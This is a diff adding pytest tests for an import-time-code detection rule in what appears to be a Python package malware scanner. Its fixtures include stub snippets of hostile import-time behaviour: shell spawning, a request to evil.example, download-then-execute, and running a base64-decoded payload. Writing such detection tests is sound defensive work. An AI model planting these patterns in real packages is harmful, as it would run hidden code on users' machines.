@@ -12,8 +12,13 @@ from crotalus.models import (
     Release,
     ReleaseMetadata,
 )
-from crotalus.rules import hidden_code_exec, pth_import_running_code, setup_py_install_time
-from crotalus.rules.static_code_analysis_helpers import calls, read
+from crotalus.rules import (
+    hidden_code_exec,
+    import_time_code,
+    pth_import_running_code,
+    setup_py_install_time,
+)
+from crotalus.rules.static_code_analysis_helpers import calls, import_time_calls, read
 
 
 def call_names(source: str) -> list[str | None]:
@@ -289,3 +294,86 @@ def test_setup_py_that_is_fine(files: dict[str, str]) -> None:
 def test_setup_py_in_wheel_is_ignored() -> None:
     files = {"setup.py": "import os\nos.system('x')"}
     assert setup_py_install_time.check(context(wheel=files)) == []
+
+
+# import_time_code
+
+
+def import_time_names(source: str) -> list[str | None]:
+    py_file = read(textwrap.dedent(source))
+    assert py_file is not None
+    return sorted(name or "" for name, _ in import_time_calls(py_file))
+
+
+def test_import_time_calls_skip_functions_and_main_guard() -> None:
+    source = """
+        import os
+        os.getcwd()
+        def later():
+            os.system("x")
+        class C:
+            os.getpid()           # class bodies run on import
+            def method(self):
+                os.system("y")
+        if __name__ == "__main__":
+            os.system("z")
+        """
+    assert import_time_names(source) == ["os.getcwd", "os.getpid"]
+
+
+@pytest.mark.parametrize(
+    "start",
+    ["_run()", "threading.Thread(target=_run).start()"],
+)
+def test_import_time_calls_follow_functions_run_on_import(start: str) -> None:
+    source = f"""
+        import os, threading
+        def _run():
+            os.system("x")
+        {start}
+        """
+    assert "os.system" in import_time_names(source)
+
+
+@pytest.mark.parametrize(
+    ("init_py", "severity"),
+    [
+        ("import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])", "high"),
+        ("import urllib.request\nurllib.request.urlopen('https://evil.example')", "high"),
+        (  # download, then run
+            "import os, requests\nrequests.get(u)\nos.system('/tmp/x')",
+            "critical",
+        ),
+        (  # run a decoded payload in a new Python process
+            "import subprocess, sys, base64\n"
+            "subprocess.Popen([sys.executable, '-c', base64.b64decode('aW1wb3J0IG9z')])",
+            "critical",
+        ),
+    ],
+)
+def test_import_time_code(init_py: str, severity: str) -> None:
+    findings = import_time_code.check(context(wheel={"pkg/__init__.py": init_py}))
+    assert rule_ids(findings) == ["import_time_code"]
+    assert findings[0].severity == severity
+    assert findings[0].evidence["files"] == ["pkg/__init__.py"]
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {"pkg/__init__.py": "import subprocess\ndef run():\n    subprocess.run(['x'])"},
+        {"pkg/__init__.py": "import os\npath = os.path.join('a', 'b')"},
+        {"setup.py": "import os\nos.system('x')"},  # setup_py_install_time's job
+        {"tests/test_pkg.py": "import subprocess\nsubprocess.run(['pytest'])"},
+        {"pkg/__main__.py": "import subprocess\nsubprocess.run(['x'])"},
+    ],
+)
+def test_import_time_code_that_is_fine(files: dict[str, str]) -> None:
+    assert import_time_code.check(context(wheel=files)) == []
+
+
+def test_import_time_code_prefers_the_wheel() -> None:
+    bad = {"pkg/__init__.py": "import os\nos.system('x')"}
+    fine = {"pkg/__init__.py": "VERSION = '1.0'"}
+    assert import_time_code.check(context(sdist=bad, wheel=fine)) == []
+    assert rule_ids(import_time_code.check(context(sdist=bad))) == ["import_time_code"]
